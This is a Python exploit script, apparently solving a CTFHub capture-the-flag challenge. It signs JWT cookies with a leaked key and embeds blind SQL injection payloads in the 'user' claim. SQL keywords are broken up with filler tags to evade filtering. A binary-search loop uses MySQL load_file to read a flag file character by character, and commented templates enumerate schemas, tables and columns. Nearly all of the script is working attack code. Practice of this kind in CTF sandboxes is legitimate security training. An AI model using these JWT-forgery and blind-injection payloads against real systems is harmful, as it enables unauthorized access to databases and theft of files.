# coding=utf-8
# 一个一个读取
# select load_file('E:\flag.txt')
# select ascii(mid((select load_file('E:\flag.txt')),1,1));
# 直接注入表读取
# create table abc(cmd text);
# insert into abc(cmd) values (load_file('E:\flag.txt'));
# select * from abc;

import jwt
import requests
import re
requests.packages.urllib3.disable_warnings()
key = "xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6"
url = "http://challenge-6761886944b031a8.sandbox.ctfhub.com:10080/"
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
# info = jwt.decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJuZXdzIjoia2V5OnhSdCpZTURxeUNDeFl4aTlhQExnY0dwbm1NMlg4aSY2In0.EpNdctJ5Knu4ZkRcatsyMOxas1QgomB0Z49qb7_eoVg",key,algorithms=['HS256'])
# if info:
    # print(info)

# payloadTmpl = "i'/**/or/**/ascii(mid(database(),{},1))>{}#"
# payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(sc<a>hema_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.S<a>CHEMATA),{},1))>{}#"
# payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(ta<a>ble_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.t<a>ables/**/wher<a>e/**/ta<a>ble_s<a>chema=dat<a>abase()),{},1))>{}#"
# payloadTmpl = "i'/**/or/**/ascii(mid((s<a>elect/**/g<a>roup_con<a>cat(col<a>umn_name)/**/fr<a>om/**/info<a>rmation_sc<a>hema.c<a>olumns/**/wher<a>e/**/ta<a>ble_s<a>chema=dat<a>abase()),{},1))>{}#"
payloadTmpl = "i'/**/or/**/ascii(mid((se<a>lect/**/lo<a>ad_fi<a>le('/fl<a>ag')),{},1))>{}#"

def half_interval():
    result = ""
    for i in range(1,55):
        min = 32
        max = 127
        while abs(max-min) > 1:
            mid = (min + max)//2 
            payload = payloadTmpl.format(i,mid)
            jwttoken = {
                "user": payload,
                "news": "success"
            }
            payload = jwt.encode(jwttoken, key, algorithm='HS256').decode("ascii")
            # print(payload)
            cookies = dict(token=str(payload))
            res = requests.get(url,cookies=cookies)
            # res = requests.get(url,cookies=cookies,proxies=proxies)
            if re.findall("success", res.text) != []:
                min = mid
            else:
                max = mid
        result += chr(max)
        print(result)

if __name__ == "__main__":
    half_interval()
    # payload = payloadTmpl.format(1,32)
    # jwttoken = {
    #     "user": payload,
    #     "news": "success"
    # }
    # print(jwttoken)
    # payload = jwt.encode(jwttoken, key, algorithm='HS256').decode("ascii")
    # print(payload)
    # cookies = dict(token=str(payload))
    # res = requests.get(url,cookies=cookies,proxies=proxies)
    # res.encoding='utf-8'
    # print(res.text)